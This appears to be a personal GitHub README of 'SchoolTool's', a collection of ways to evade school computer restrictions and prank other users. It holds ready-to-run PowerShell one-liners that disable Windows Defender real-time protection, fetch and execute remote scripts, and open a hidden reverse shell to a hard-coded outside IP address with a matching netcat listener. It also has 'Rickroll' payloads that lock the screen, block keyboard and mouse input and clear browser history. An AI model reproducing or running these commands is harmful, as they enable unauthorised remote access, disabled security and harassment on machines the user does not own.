# SchoolTool's

## SchoolTool's - (For People who Hate IT Admins, abusing CIPA by blocking other content) / Windows Only (For Now Atleast)

Disclaimer : 

Many of The Stuff presented here May/May-not work for you, this is more of a personal Page for me to get quick access to links and other stuff. Its adviced not to Use/Follow These unless you know what your doing.

### An idiot who loves to troll people...
### Also someone who loves to bypass restricted content in school.

## [k-proxy](https://kproxy.com/downloads.jsp)

### I use this since my School blocks it...,I just keep it here since its easy for me to download...

### Direct Download (GitHub) -

[Download](https://github.com/OPstriker/k-proxy/raw/56c1920e7dda8c4d18de3910a475221c12b8f363/kproxyagent_windows.zip)

### Chrome Extension -

[Link](https://chrome.google.com/webstore/detail/kproxy-extension/gdocgbfmddcfnlnpmnghmjicjognhonm)

## Registry Files -

### Some Regesitry file's to enable Blocked Stuff on Restricted Computers -

[Download](https://github.com/OPstriker/Regedit-Patches/blob/8bc690a50fac7ae9f03b294f745fdb65800c2d6e/RPatch.zip?raw=true)

## ReverseShell (PowerShell) -

### Listener (Linux Recomended)-
```
sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
```
### Disable Windows Realtime Protection -
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Client -
```
powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
```
### Combined Version - 
```
powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
```
## PowerTools (PowerShell) (Requires Admin Perms For all Functionality) -

### Disable Mouse/Keyboard Input (Cant Seem to Disable TrackPad :/ input)- Change 4 to something Longer if you Wish
```
IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing); Disable-UserInput -seconds 4 | Out-Null
```
### Working ScreenLock, Locks Your Screen and Prevents user Interaction For a Specific Time (Change 4 to something Else)
```
IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 4
```
### Control Volume - 
```
IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 99
```
### Working-Rickroll - (Set's Volume, Lock's Screen)
```
Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=o-YBDTqX_ZU; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 60; Stop-Process -name "chrome"; Clear-History
```
### Test (Laptop)
```
Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=Y7FrLagBXng; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 30;
```
### Test (Desktop)
```
Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=Y7FrLagBXng; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing); Disable-UserInput -seconds 30;
```
## Azure Stuff (My School Uses it)

### To List all Devices the user has connected to on an AD Domain.
```
https://portal.azure.com/#blade/Microsoft_AAD_IAM/UserDetailsMenuBlade/Devices/userId/%3CUSER%20ID%3E/menuId/Devices
```

This Page May Have Loads of Error's since I suck at english so avoid em pls lol...
